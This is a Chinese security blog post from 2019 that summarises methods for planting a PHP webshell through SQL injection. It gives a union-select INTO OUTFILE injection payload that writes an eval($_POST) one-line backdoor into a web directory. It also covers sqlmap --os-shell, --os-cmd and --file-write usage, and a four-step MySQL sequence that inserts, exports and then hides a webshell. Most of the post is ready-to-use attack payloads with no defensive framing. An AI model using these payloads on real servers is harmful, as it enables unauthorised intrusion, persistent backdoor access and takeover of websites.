<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> SQL注入写WebShell方式小结 · Mi1k7ea</title><meta name="description" content="SQL注入写WebShell方式小结 - Mi1k7ea"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/1.jpg"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://www.mi1k7ea.com/atom.xml" title="Mi1k7ea"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/1.jpg" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">MI1K7EA</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">归档</a></li><li class="nav-list-item"><a href="/tags/" target="_self" class="nav-list-link">分类</a></li><li class="nav-list-item"><a href="/about/" target="_self" class="nav-list-link">关于</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">SQL注入写WebShell方式小结</h1><div class="post-info">2019年1月1日</div><div class="post-content"><p>这里小结一下通过SQL注入写入WebShell的方法。</p>
<p>通过SQL注入select into outfile实现，如：</p>
<p>1’ union select 1,’\&lt;?php eval($_POST[a]);?&gt;’ INTO OUTFILE ‘/var/www/tmp/nb.php’#</p>
<p>前提都是需要对目标目录具有写权限。</p>
<h2 id="–os-cmd-”net-user”"><a href="#–os-cmd-”net-user”" class="headerlink" title="–os-cmd=”net user”"></a>–os-cmd=”net user”</h2><p>交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径<br>下创建文件返回结果，然后再自动删除。</p>
<p>##–os-shell<br>写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。<br>注意:关闭sqlmap文件就会被删除。</p>
<p>##本地写入webshell<br>先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，–file-write “./mst/mst.txt” –file-dest “网站的绝对路径/1.php”。</p>
<p>注意需要最高权限。</p>
<p>MySQL写木马，通常可以通过phpmyadmin来实现。</p>
<p>前提条件：有读写的权限，有CREATE、INSERT、SELECT的权限。</p>
<p>1、创建一个表</p>
<p>CREATE TABLE a (cmd text NOT NULL);</p>
<p>2、插入数据</p>
<p>INSERT INTO a (cmd) VALUES(‘\&lt;?php eval($_POST[‘password’]);?&gt;’);</p>
<p>3、导出一句话</p>
<p>SELECT cmd from a into outfile ‘/var/www/tmp/webshell.php’;</p>
<p>4、删除表</p>
<p>Drop TABLE IF EXISTS a;</p>
</div></article></div></main><footer><div class="paginator"><a href="/2019/01/01/Python安全小工具之反编译pyc文件/" class="prev">上一篇</a><a href="/2019/01/01/Linux环境与相关工具/" class="next">下一篇</a></div><div class="copyright"><p>© 2019 - 2020 <a href="https://www.mi1k7ea.com">Mi1k7ea</a>  |  <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span> </span>  |  <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span> 次</span></p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></body></html>